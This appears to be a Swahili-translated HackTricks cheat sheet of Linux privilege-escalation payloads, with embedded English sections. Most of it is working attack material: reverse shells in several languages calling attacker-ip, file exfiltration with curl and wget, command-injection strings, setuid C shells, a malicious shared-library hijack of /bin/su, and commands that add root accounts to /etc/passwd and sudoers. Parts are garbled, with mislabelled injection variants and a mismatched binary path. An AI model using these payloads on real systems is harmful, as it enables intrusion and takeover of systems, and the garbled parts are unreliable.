# Mipangilio ya kutekeleza

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

### Payloads to Execute

#### Shell

A shell payload is a command or script that is executed in a shell environment. It allows an attacker to gain remote access to a target system and execute commands.

##### Bash

```bash
bash -c 'command'
```

##### Python

```bash
python -c 'import os; os.system("command")'
```

##### Perl

```bash
perl -e 'system("command")'
```

##### Ruby

```bash
ruby -e 'system("command")'
```

##### PHP

```bash
php -r 'system("command");'
```

##### Node.js

```bash
node -e 'require("child_process").exec("command", function(error, stdout, stderr) { console.log(stdout); });'
```

#### Reverse Shell

A reverse shell payload is used to establish a connection from the target system to the attacker's machine. This allows the attacker to gain remote access to the target system.

##### Bash

```bash
bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
```

##### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",attacker-port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

##### Perl

```bash
perl -e 'use Socket;$i="attacker-ip";$p=attacker-port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

##### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("attacker-ip",attacker-port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

##### PHP

```bash
php -r '$sock=fsockopen("attacker-ip",attacker-port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

##### Netcat

```bash
nc -e /bin/sh attacker-ip attacker-port
```

##### Socat

```bash
socat tcp-connect:attacker-ip:attacker-port exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

#### File Upload

A file upload payload is used to upload a file to a target system. This can be useful for uploading malicious files or tools to the target system.

##### Curl

```bash
curl -F "file=@/path/to/file" http://target-ip/upload.php
```

##### Wget

```bash
wget --post-file=/path/to/file http://target-ip/upload.php
```

##### Netcat

```bash
nc target-ip target-port < /path/to/file
```

##### SCP

```bash
scp /path/to/file user@target-ip:/path/to/destination
```

##### FTP

```bash
ftp target-ip
ftp> put /path/to/file
ftp> quit
```

##### TFTP

```bash
tftp target-ip
tftp> put /path/to/file
tftp> quit
```

#### Command Injection

A command injection payload is used to execute arbitrary commands on a target system by injecting malicious commands into vulnerable input fields.

##### Basic Command Injection

```bash
command; malicious-command
```

##### Command Injection with Substitution

```bash
command; $(malicious-command)
```

##### Command Injection with Encapsulation

```bash
command; `malicious-command`
```

##### Command Injection with Newline

```bash
command%0Amalicious-command
```

##### Command Injection with Pipe

```bash
command | malicious-command
```

##### Command Injection with Semicolon

```bash
command && malicious-command
```

##### Command Injection with Double Ampersand

```bash
command || malicious-command
```

##### Command Injection with Double Pipe

```bash
command |& malicious-command
```

##### Command Injection with Variable

```bash
command; echo $malicious-command
```

##### Command Injection with Subshell

```bash
command; (malicious-command)
```

##### Command Injection with Process Substitution

```bash
command; <(malicious-command)
```

##### Command Injection with Command Substitution

```bash
command; $(malicious-command)
```

##### Command Injection with Arithmetic Substitution

```bash
command; $((malicious-command))
```

##### Command Injection with Filename

```bash
command; $(cat malicious-file)
```

##### Command Injection with File Descriptor

```bash
command; cat <&3
```

##### Command Injection with Input Redirection

```bash
command; cat <<< malicious-command
```

##### Command Injection with Output Redirection

```bash
command; cat > malicious-file
```

##### Command Injection with Command Substitution and Output Redirection

```bash
command; $(malicious-command) > malicious-file
```

##### Command Injection with Command Substitution and Input Redirection

```bash
command; $(malicious-command) <<< malicious-input
```

##### Command Injection with Command Substitution and Output Redirection to File Descriptor

```bash
command; $(malicious-command) > /dev/tcp/attacker-ip/attacker-port
```

##### Command Injection with Command Substitution and Output Redirection to Reverse Shell

```bash
command; $(malicious-command) > /dev/tcp/attacker-ip/attacker-port 0<&1 2>&1
```
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Kubadilisha faili ili kuongeza mamlaka

### Faili za Kawaida

* Ongeza mtumiaji na nenosiri kwenye _/etc/passwd_
* Badilisha nenosiri ndani ya _/etc/shadow_
* Ongeza mtumiaji kwenye sudoers kwenye _/etc/sudoers_
* Tumia docker kupitia soketi ya docker, kawaida kwenye _/run/docker.sock_ au _/var/run/docker.sock_

### Kubadilisha maktaba

Angalia maktaba inayotumiwa na baadhi ya binary, katika kesi hii `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
Katika kesi hii, jaribu kujifanya kuwa `/lib/x86_64-linux-gnu/libaudit.so.1`.\
Kwa hivyo, angalia kazi za maktaba hii zinazotumiwa na binary ya **`su`**:
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
Alama za `audit_open`, `audit_log_acct_message`, `audit_log_acct_message` na `audit_fd` zinaweza kuwa kutoka kwa maktaba ya libaudit.so.1. Kwa kuwa libaudit.so.1 itafutwa na maktaba mbaya ya pamoja, alama hizi lazima ziwe zipo katika maktaba mpya ya pamoja, vinginevyo programu haitaweza kupata alama na itafunga.
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Sasa, kwa kuita **`/bin/su`** tu, utapata kikao kama mtumiaji mkuu.

## Skrini

Je, unaweza kufanya mtumiaji mkuu afanye kitu?

### **www-data kuwa sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Badilisha nenosiri la root**

Ili kubadilisha nenosiri la root, unaweza kutumia amri ifuatayo:

```bash
sudo passwd root
```

Amri hii itakuruhusu kubadilisha nenosiri la mtumiaji wa root kwa mfumo wako. Unapaswa kuwa na ruhusa ya sudo ili kuweza kutumia amri hii. Baada ya kutekeleza amri, utaulizwa kuingiza nenosiri jipya la root mara mbili kwa uthibitisho. Kisha, nenosiri la root litabadilishwa na kuwa jipya.
```bash
echo "root:hacked" | chpasswd
```
### Ongeza mtumiaji mpya wa root kwenye /etc/passwd

```bash
echo 'newrootuser:$6$SALT$ENCRYPTEDPASSWORD:0:0:root:/root:/bin/bash' >> /etc/passwd
```

Hii itaongeza mtumiaji mpya wa root kwenye faili ya /etc/passwd. Mtumiaji huyu atakuwa na jina la "newrootuser" na nywila iliyosimbwa itahitajika. Nywila inapaswa kusimbwa kwa kutumia salt na algorithm ya kusimbwa kama vile SHA-512. Mtumiaji huyu atakuwa na ID ya mtumiaji na ID ya kikundi cha 0, na anaweza kufikia saraka ya /root na kutumia shell ya /bin/bash.
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
